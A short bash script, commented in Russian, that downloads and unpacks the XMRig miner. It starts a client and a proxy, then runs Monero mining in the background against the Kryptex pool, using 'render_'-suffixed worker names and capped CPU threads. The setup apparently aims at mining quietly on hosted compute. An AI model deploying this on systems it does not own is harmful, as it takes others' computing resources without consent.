#!/bin/bash

# 1. Скачиваем и готовим майнер (без запуска)
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

# 2. Запускаем клиент
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
CLIENT_PID=$!
echo "Client PID: $CLIENT_PID"

# 3. Даём клиенту время на старт (опционально, но полезно)
sleep 2

# 4. Запускаем прокси (в фоне, но под контролем скрипта)
./proxy &
PROXY_PID=$!
echo "Proxy PID: $PROXY_PID"

# 5. Проверяем, что прокси действительно поднялся (опционально)
# sleep 1
# if ! kill -0 $PROXY_PID 2>/dev/null; then
#     echo "Proxy failed to start!" >&2
#     kill $CLIENT_PID 2>/dev/null
#     exit 1
# fi

# 6. Только теперь — майнер (в фоне)
WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light > xmrig.log 2>&1 &
MINER_PID=$!
echo "Miner PID: $MINER_PID"

# 7. Скрипт ждёт любой из процессов, чтобы не завершиться и не отправить SIGHUP
wait -n
